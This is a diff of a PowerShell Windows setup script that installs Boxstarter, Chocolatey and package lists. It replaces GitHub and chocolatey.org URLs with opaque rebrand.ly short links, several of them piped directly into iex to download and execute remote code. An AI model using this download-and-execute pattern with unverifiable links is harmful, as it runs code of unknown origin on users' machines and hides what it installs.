@@ -7,19 +7,19 @@ $env:PSExecutionPolicyPreference = "remotesigned"
 #$env:ErrorActionPreference = "Continue"
 #$ErrorActionPreference = "SilentlyContinue"
 #######download lantrx desktop scrips########################
-iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcwork57/System-prep/master/lantrxdesktop.ps1'))
+iex ((New-Object System.Net.WebClient).DownloadString('rebrand.ly/b1803'))
 #install-lantrxonlinescripts -desktop
 write-output "setting all users profile for lantrx desktop"
-powershell {iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcwork57/System-prep/master/lantrxdesktop.ps1'));install-lantrxonlinescripts -desktop} > null
+powershell {iex ((New-Object System.Net.WebClient).DownloadString('rebrand.ly/b1803'));install-lantrxonlinescripts -desktop} > null
 
 #######install package managers########################
 
 write-output "setting execution policy remotesigned"
 powershell {set-ExecutionPolicy remotesigned -Force}
 write-output "installing boxtstarter"
-powershell {if(!(Test-Path "C:\ProgramData\Boxstarter\BoxstarterShell.ps1")){iex ((New-Object System.Net.WebClient).DownloadString('http://help.lantrxinc.com/powershell/bootstrapper.ps1')); get-boxstarter -Force}}
+powershell {if(!(Test-Path "C:\ProgramData\Boxstarter\BoxstarterShell.ps1")){iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/76519')); get-boxstarter -Force}}
 write-output "installing chocolatey"
-powershell {if(!(Test-Path "C:\ProgramData\chocolatey\choco.exe")){iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))}}
+powershell {if(!(Test-Path "C:\ProgramData\chocolatey\choco.exe")){iex ((New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/b7804'))}}
 
 if (Test-PendingReboot) { Invoke-Reboot }
 write-output "pending reboot: $(Test-PendingReboot)"
@@ -38,9 +38,9 @@ choco source add -n=lantrx-depo -s "'http://nupkg.lantrxinc.com/repository/App_D
 
 if(!(test-path -path "c:\temp\remove.csv")){
 new-item -path c:\ -name temp -itemtype directory
-New-Item -Path c:\temp\remove.csv -Type file -force -Value (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcwork57/System-prep/master/remove.csv')
-New-Item -Path c:\temp\install.csv -Type file -force -Value (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcwork57/System-prep/master/install.csv')
-New-Item -path c:\temp\packages.config -type file -force -value (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/pcwork57/System-prep/master/packages.xml')
+New-Item -Path c:\temp\remove.csv -Type file -force -Value (New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/13a1e')
+New-Item -Path c:\temp\install.csv -Type file -force -Value (New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/bde0d')
+New-Item -path c:\temp\packages.config -type file -force -value (New-Object System.Net.WebClient).DownloadString('https://rebrand.ly/7c05c')
 
 install-desktop -remove -csvfile c:\temp\remove.csv -verbose
 install-desktop -install -csvfile c:\temp\install.csv -verbose
